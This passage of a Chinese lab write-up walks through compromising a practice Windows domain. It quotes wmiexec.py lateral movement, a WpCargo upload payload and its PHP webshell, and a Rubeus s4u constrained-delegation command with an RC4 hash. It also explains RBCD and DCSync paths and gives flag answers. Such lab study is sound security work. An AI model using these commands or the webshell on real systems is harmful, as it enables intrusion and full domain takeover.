mxhYg==
```

横向过去

```shell
wmiexec.py DC.xiaorang.lab -k -no-pass -dc-ip 172.22.2.3
```

也可以直接读type \\DC.xiaorang.lab\C$\Users\Administrator\flag\flag04.txt

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20251014133636689.png)

flag04: flag{70da6fee-a107-440a-b6cb-8e56a69f0ed1}





### 问题

#### 蚁剑CMDLINUX是什么？

这个需要分析一下WpCargo注入的shell

脚本通过/wp-content/plugins/wpcargo/includes/barcode.php上传了一个二进制文件

```python
_payload = 'x1x1111x1xx1xx111xx11111xx1x111x1x1x1xxx11x1111xx1x11xxxx1xx1xxxxx1x1x1xx1x1x11xx1xxxx1x11xx111xxx1xx1xx1x1x1xxx11x1111xxx1xxx1xx1x111xxx1x1xx1xxx1x1x1xx1x1x11xxx11xx1x11xx111xx1xxx1xx11x1x11x11x1111x1x11111x1x1xxxx'
```

根据注释可以知道最后生成的shell为`<?=$_GET[1]($_POST[2]);?>`

还真找到了参考

https://rivers.chaitin.cn/blog/cq94cr90lnechd2431ng

因为参数用的system而不是一句话常用的eval，蚁剑集成了system函数执行命令的webshell，就必须用CMDLinux

所以这里改成1=eval就能注入PHP类型吗？不行，因为eval本身不能作为变量传递，所以这里只能改Payload，至于这个没分析过漏洞，就不瞎BB了

关于蚁剑的几种不常见的连接类型，简书有详细的叙述：

https://www.jianshu.com/p/a89ad062c017

#### 什么情况下可以通过Rebeus在有 CIFS 服务的约束性委派情况下申请到TGT

在约束性委派场景中，服务账户有一个特殊的属性

```sh
# 关键属性：msDS-AllowedToActOnBehalfOfOtherIdentity
msDS-AllowedToDelegateTo: CIFS/DC01.domain.com
```

如果攻击者控制了一个服务账户，服务账户配置了到 `CIFS` 服务的约束性委派，就能打Rebeus s4u，只不过刚好CIFS就是LDAP域控，打出的TGT票据就能直接拿下域控

S4U2Self 允许：服务可以为**任何用户**请求访问**自己**的服务票据

正常的S4U2Self请求如下

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20251014154017378.png)

利用S4U2Proxy去代理服务

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20251014154045134.png)

也就是利用S4U2Self获取ST，然后到处乱用这个ST，这个ST能请求其他服务的



如果我们有一个配置了约束性委派的服务账户，并且该账户被允许委派到域控制器的LDAP服务，那么我们可以通过S4U2Self和S4U2Proxy获取域控制器LDAP服务的ST。然后，利用LDAP服务的ST，可以获取到黄金票据TGT。

因此，整个攻击过程需要：

- 一个配置了约束性委派的服务账户，并且该账户被允许委派到域控制器的LDAP（或CIFS，但CIFS不能直接用于DCSync，所以通常需要LDAP）服务。
- 我们知道该服务账户的密码或哈希，以便获取该服务账户的TGT。

然后，通过S4U2Proxy获取域控制器LDAP服务的ST，并使用该ST进一步获取TGT。

Rubeus.exe完成了以上的全部部分，s4u参数也就是约束委派利用，最后得到域管的TGT

```sh
Rubeus.exe s4u /user:MSSQLSERVER$ /rc4:833b7fd6cd241c433efffde59363dbcf /domain:xiaorang.lab /impersonateuser:Administrator /msdsspn:cifs/DC.xiaorang.lab /nowrap /ptt
```

得到域管理员TGT保存到本地，就可以直接使用wmiexec.py no-pass或者直接访问域控了

#### 委派攻击和RBCD攻击的组合

delivery靶机也用到了约束委派攻击

```
# RBCD攻击的三个必要条件
1. 对目标计算机/服务有"Write"权限
2. 拥有一个有效的服务账户
3. 目标服务运行在Windows Server 2012及以上版本
```

一般是GenericWrite权限作为条件

delivery的一个普通靶机对域控有GenericWrite权限，利用RBCD在域控上创建新的服务账户，然后配置了RBCD，也就是修改了msDS-AllowedToActOnBehalfOfOtherIdentity属性

接下来就是委派攻击了，利用RBCD创建的服务账户获取目标服务器的TGT，恰好目标就是LDAP域管，所以拿下域控。

所以RBCD也就是个有Write权限下作为委派攻击的扩展，去为委派攻击创造条件

只不过GenericWrite也就意味着可以向对象继续添加权限，完全可以利用GenericWrite 添加 DCSync 权限（脚本为Powerview），然后打DCSync，这是delivery有两解的原因

